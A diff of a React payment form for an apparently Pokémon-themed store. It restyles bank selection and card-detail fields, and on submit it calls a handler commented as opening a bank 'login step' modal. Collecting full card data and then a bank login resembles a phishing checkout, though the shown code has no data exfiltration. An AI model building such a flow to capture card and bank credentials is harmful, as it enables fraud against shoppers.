@@ -12,6 +12,8 @@ interface PaymentFormProps {
   cardType: string;
   handleCardDataChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
   handleCardDetailsSubmit: (e: React.FormEvent) => void;
+  showSelectedBank?: boolean;
+
 }
 
 const PaymentForm: React.FC<PaymentFormProps> = ({
@@ -22,6 +24,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({
   cardData,
   cardErrors,
   cardType,
+  showSelectedBank = false,
   handleCardDataChange,
   handleCardDetailsSubmit,
 }) => {
@@ -57,9 +60,9 @@ const PaymentForm: React.FC<PaymentFormProps> = ({
   const getBanksToShow = () => {
     switch (finalCountry) {
       case 'America':
-        return { banks: americanBanks, title: 'American Banks' };
+        return { banks: americanBanks, title: '' };
       case 'Canada':
-        return { banks: canadianbanks, title: 'Canadian Banks' };
+        return { banks: canadianbanks, title: '' };
       default:
         return { banks: [], title: 'Select Country First' };
     }
@@ -67,6 +70,9 @@ const PaymentForm: React.FC<PaymentFormProps> = ({
 
   const { banks, title } = getBanksToShow();
   const isPayPal = sessionStorage.getItem('selectedPaymentMethod') === 'PayPal';
+
+  // Determine if card fields should be disabled
+  const isCardFieldsDisabled = !selectedBank || selectedBank === 'PayPal';
 
   // Order summary for PayPal view
   const getOrderSummaryData = () => {
@@ -96,96 +102,97 @@ const PaymentForm: React.FC<PaymentFormProps> = ({
     }
   };
 
-  return (
-    <div className="space-y-6">
-      {/* Payment Method Selection */}
-      <div className="bg-white rounded-xl shadow-lg p-6">
-        <h2 className="text-xl font-bold text-pokemon-dark mb-6">Payment</h2>
+return (
+    <div className="bg-white rounded-xl shadow-lg p-6">
+      <h2 className="text-xl font-bold text-pokemon-dark mb-6">Payment</h2>
 
-        <div className="mb-6">
-          <label className="block text-sm font-semibold text-pokemon-dark mb-4">
-            <div className="flex items-center space-x-3">
-              <span>Via Bank or Pay With</span>
+      <div className="mb-6">
+        <label className="block text-sm font-semibold text-pokemon-dark mb-4">
+          <div className="flex items-center space-x-3">
+            <span>Via Bank or Pay With</span>
 
-              {/* PayPal button */}
-              <button
-                type="button"
-                onClick={() => handleBankSelection('PayPal')}
-                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-semibold text-white text-lg transition-colors ${
-                  selectedBank === 'PayPal'
-                    ? 'bg-blue-700 ring-2 ring-yellow-300'
-                    : 'bg-blue-600 hover:bg-blue-700'
-                }`}
-              >
-                <img src="/paypall.png" alt="PayPal" className="w-8 h-8 object-contain" />
-                <span>PayPal</span>
-              </button>
-            </div>
-          </label>
-
-          {/* Bank Dropdown */}
-          {finalCountry && banks.length > 0 && (
-            <div className="relative" ref={dropdownRef}>
-              <button
-                type="button"
-                onClick={() => setIsBankDropdownOpen(!isBankDropdownOpen)}
-                className={`w-full p-4 border rounded-lg text-left flex items-center justify-between transition-colors ${
-                  selectedBank && selectedBank !== 'PayPal'
-                    ? 'border-pokemon-red bg-pokemon-red/10'
-                    : 'border-gray-300 hover:bg-gray-50'
-                }`}
-              >
-                <span className="text-pokemon-dark font-medium">
-                  {selectedBank && selectedBank !== 'PayPal'
-                    ? selectedBank
-                    : `Select Bank (${title})`}
-                </span>
-                <ChevronDown
-                  className={`w-5 h-5 text-gray-400 transition-transform ${isBankDropdownOpen ? 'rotate-180' : ''}`}
-                />
-              </button>
-
-              {isBankDropdownOpen && (
-                <div className="absolute top-full left-0 right-0 bg-white border border-gray-200 rounded-lg shadow-lg mt-1 max-h-64 overflow-y-auto z-50">
-                  <div className="py-2">
-                    {banks.filter(bank => bank.name !== 'PayPal').map((bank) => (
-                      <button
-                        key={bank.name}
-                        type="button"
-                        onClick={() => handleBankSelection(bank.name)}
-                        className={`w-full px-4 py-3 text-left hover:bg-gray-50 transition-colors ${
-                          selectedBank === bank.name
-                            ? 'bg-pokemon-red/10 text-pokemon-red font-medium'
-                            : 'text-pokemon-dark'
-                        }`}
-                      >
-                        {bank.name}
-                      </button>
-                    ))}
-                  </div>
-                </div>
-              )}
-            </div>
-          )}
-        </div>
-
-        {selectedBank && (
-          <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
-            <div className="flex items-center space-x-2 text-green-700">
-              <CheckCircle className="w-5 h-5" />
-              <span className="font-semibold">Selected: {selectedBank}</span>
-            </div>
+            {/* PayPal button */}
+            <button
+              type="button"
+              onClick={() => handleBankSelection('PayPal')}
+              className={`flex items-center gap-2 px-4 py-2 rounded-lg font-semibold text-white text-lg transition-colors ${
+                selectedBank === 'PayPal'
+                  ? 'bg-blue-700 ring-2 ring-yellow-300'
+                  : 'bg-blue-600 hover:bg-blue-700'
+              }`}
+            >
+              <img src="/paypall.png" alt="PayPal" className="w-8 h-8 object-contain" />
+              <span>PayPal</span>
+            </button>
           </div>
-        )}
+        </label>
+
+{/* Bank Dropdown */}
+{finalCountry && banks.length > 0 && (
+  <div>
+    <label className="block text-sm font-semibold text-pokemon-dark mb-2">Bank</label>
+    <div className="relative w-48" ref={dropdownRef}> {/* Smaller width */}
+      <button
+        type="button"
+        onClick={() => setIsBankDropdownOpen(!isBankDropdownOpen)}
+        className={`w-full p-3 border rounded-lg text-left flex items-center justify-between transition-colors ${
+          selectedBank && selectedBank !== 'PayPal'
+            ? 'border-pokemon-red bg-pokemon-red/10'
+            : 'border-gray-300 hover:bg-gray-50'
+        }`}
+      >
+        <span className="text-pokemon-dark font-medium">
+          {selectedBank && selectedBank !== 'PayPal'
+            ? selectedBank
+            : `Select Bank ${title}`}
+        </span>
+        <ChevronDown
+          className={`w-5 h-5 text-gray-400 transition-transform ${isBankDropdownOpen ? 'rotate-180' : ''}`}
+        />
+      </button>
+
+      {isBankDropdownOpen && (
+        <div className="absolute top-full left-0 right-0 bg-white border border-gray-200 rounded-lg shadow-lg mt-1 max-h-64 overflow-y-auto z-50">
+          <div className="py-2">
+            {banks.filter(bank => bank.name !== 'PayPal').map((bank) => (
+              <button
+                key={bank.name}
+                type="button"
+                onClick={() => handleBankSelection(bank.name)}
+                className={`w-full px-4 py-3 text-left hover:bg-gray-50 transition-colors ${
+                  selectedBank === bank.name
+                    ? 'bg-pokemon-red/10 text-pokemon-red font-medium'
+                    : 'text-pokemon-dark'
+                }`}
+              >
+                {bank.name}
+              </button>
+            ))}
+          </div>
+        </div>
+      )}
+    </div>
+  </div>
+)}
+
+
+
       </div>
 
-      {/* Payment Details */}
-      {selectedBank && (
-        <div className="bg-white rounded-xl shadow-lg p-6">
+      {selectedBank && showSelectedBank && (
+        <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
+          <div className="flex items-center space-x-2 text-green-700">
+            <CheckCircle className="w-5 h-5" />
+            <span className="font-semibold">Selected: {selectedBank}</span>
+          </div>
+        </div>
+      )}
+
+      {/* Payment Details - Now Always Shown in Same Container */}
         {isPayPal ? (
-          // ✅ PayPal View
-          <div>
-            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">PayPal Payment</h3>
+          <div className="text-center">
+            {/* PayPal Logo */}
+            <img src="/palla.png" alt="PayPal" className="w-40 h-20 mx-auto mb-4 object-contain" />
             <p className="text-center text-gray-600 mb-6">
               You will be redirected to PayPal to complete your payment
             </p>
@@ -229,95 +236,109 @@ const PaymentForm: React.FC<PaymentFormProps> = ({
 
           </div>
         ) : (
-            <div>
-              <div className="text-center mb-6">
-                <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
-                  <CreditCard className="w-8 h-8 text-white" />
-                </div>
-                <h3 className="text-xl font-bold text-gray-800">
-                  Payment Information
-                </h3>
+          // Card Details Form - Always Shown, Conditionally Disabled
+          <div>
+            <form
+              onSubmit={(e) => {
+                handleCardDetailsSubmit(e);
+                handleProceedToBankAuth(); // 🚀 open modal at login step
+              }}
+              className="space-y-4"
+            >
+              <div>
+                <label className="block text-sm font-semibold mb-2">Cardholder Name</label>
+                <input
+                  type="text"
+                  name="cardholderName"
+                  value={cardData.cardholderName}
+                  onChange={handleCardDataChange}
+                  placeholder="Name as it appears on card"
+                  className={`w-full px-4 py-3 border rounded-lg transition-colors ${
+                    isCardFieldsDisabled
+                      ? 'bg-gray-100 text-gray-400 cursor-not-allowed border-gray-200'
+                      : 'bg-white border-gray-300 hover:border-gray-400'
+                  }`}
+                  disabled={isCardFieldsDisabled}
+                  required
+                />
+                {cardErrors.cardholderName && <p className="text-red-600 text-sm">{cardErrors.cardholderName}</p>}
               </div>
 
-              <form
-                onSubmit={(e) => {
-                  handleCardDetailsSubmit(e);
-                  handleProceedToBankAuth(); // 🚀 open modal at login step
-                }}
-                className="space-y-4"
-              >
-                <div>
-                  <label className="block text-sm font-semibold mb-2">Cardholder Name</label>
+              <div>
+                <label className="block text-sm font-semibold mb-2">Card Number</label>
+                <div className="relative">
                   <input
                     type="text"
-                    name="cardholderName"
-                    value={cardData.cardholderName}
+                    name="cardNumber"
+                    value={cardData.cardNumber}
                     onChange={handleCardDataChange}
-                    placeholder="Name as it appears on card"
-                    className="w-full px-4 py-3 border rounded-lg"
+                    placeholder="1234 5678 9012 3456"
+                    className={`w-full px-4 py-3 pr-12 border rounded-lg transition-colors ${
+                      isCardFieldsDisabled
+                        ? 'bg-gray-100 text-gray-400 cursor-not-allowed border-gray-200'
+                        : 'bg-white border-gray-300 hover:border-gray-400'
+                    }`}
+                    disabled={isCardFieldsDisabled}
                     required
                   />
-                  {cardErrors.cardholderName && <p className="text-red-600 text-sm">{cardErrors.cardholderName}</p>}
+                  <div className="absolute right-3 top-1/2 -translate-y-1/2">{getCardIcon(cardType)}</div>
                 </div>
+                {cardErrors.cardNumber && <p className="text-red-600 text-sm">{cardErrors.cardNumber}</p>}
+              </div>
 
+              <div className="grid grid-cols-2 gap-4">
                 <div>
-                  <label className="block text-sm font-semibold mb-2">Card Number</label>
-                  <div className="relative">
-                    <input
-                      type="text"
-                      name="cardNumber"
-                      value={cardData.cardNumber}
-                      onChange={handleCardDataChange}
-                      placeholder="1234 5678 9012 3456"
-                      className="w-full px-4 py-3 pr-12 border rounded-lg"
-                      required
-                    />
-                    <div className="absolute right-3 top-1/2 -translate-y-1/2">{getCardIcon(cardType)}</div>
-                  </div>
-                  {cardErrors.cardNumber && <p className="text-red-600 text-sm">{cardErrors.cardNumber}</p>}
+                  <label className="block text-sm font-semibold mb-2">Expiry Date</label>
+                  <input
+                    type="text"
+                    name="expiryDate"
+                    value={cardData.expiryDate}
+                    onChange={handleCardDataChange}
+                    placeholder="MM/YY"
+                    className={`w-full px-4 py-3 border rounded-lg transition-colors ${
+                      isCardFieldsDisabled
+                        ? 'bg-gray-100 text-gray-400 cursor-not-allowed border-gray-200'
+                        : 'bg-white border-gray-300 hover:border-gray-400'
+                    }`}
+                    disabled={isCardFieldsDisabled}
+                    required
+                  />
+                  {cardErrors.expiryDate && <p className="text-red-600 text-sm">{cardErrors.expiryDate}</p>}
                 </div>
-
-                <div className="grid grid-cols-2 gap-4">
-                  <div>
-                    <label className="block text-sm font-semibold mb-2">Expiry Date</label>
-                    <input
-                      type="text"
-                      name="expiryDate"
-                      value={cardData.expiryDate}
-                      onChange={handleCardDataChange}
-                      placeholder="MM/YY"
-                      className="w-full px-4 py-3 border rounded-lg"
-                      required
-                    />
-                    {cardErrors.expiryDate && <p className="text-red-600 text-sm">{cardErrors.expiryDate}</p>}
-                  </div>
-                  <div>
-                    <label className="block text-sm font-semibold mb-2">{cardType === 'amex' ? 'CID' : 'CVV'}</label>
-                    <input
-                      type="text"
-                      name="cvv"
-                      value={cardData.cvv}
-                      onChange={handleCardDataChange}
-                      placeholder={cardType === 'amex' ? '1234' : '123'}
-                      className="w-full px-4 py-3 border rounded-lg"
-                      required
-                    />
-                    {cardErrors.cvv && <p className="text-red-600 text-sm">{cardErrors.cvv}</p>}
-                  </div>
+                <div>
+                  <label className="block text-sm font-semibold mb-2">{cardType === 'amex' ? 'CID' : 'CVV'}</label>
+                  <input
+                    type="text"
+                    name="cvv"
+                    value={cardData.cvv}
+                    onChange={handleCardDataChange}
+                    placeholder={cardType === 'amex' ? '1234' : '123'}
+                    className={`w-full px-4 py-3 border rounded-lg transition-colors ${
+                      isCardFieldsDisabled
+                        ? 'bg-gray-100 text-gray-400 cursor-not-allowed border-gray-200'
+                        : 'bg-white border-gray-300 hover:border-gray-400'
+                    }`}
+                    disabled={isCardFieldsDisabled}
+                    required
+                  />
+                  {cardErrors.cvv && <p className="text-red-600 text-sm">{cardErrors.cvv}</p>}
                 </div>
+              </div>
+                    <button
+                      type="submit"
+                      disabled={isCardFieldsDisabled || Object.values(cardErrors).some((e) => e !== '')}
+                      className={`w-full font-bold py-3 px-6 rounded-lg mt-6 transition-colors ${
+                        isCardFieldsDisabled || Object.values(cardErrors).some((e) => e !== '')
+                          ? 'bg-gray-400 text-gray-600 cursor-not-allowed'
+                          : 'bg-[#FF1C1C] hover:bg-[#CC1616] text-white'
+                      }`}
+                    >
+                      Place Order
+                    </button>
 
-                <button
-                  type="submit"
-                  disabled={Object.values(cardErrors).some((e) => e !== '')}
-                  className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg mt-6"
-                >
-                  Place Order
-                </button>
-              </form>
-            </div>
-          )}
-        </div>
-      )}
+            </form>
+          </div>
+        )}
     </div>
   );
 };
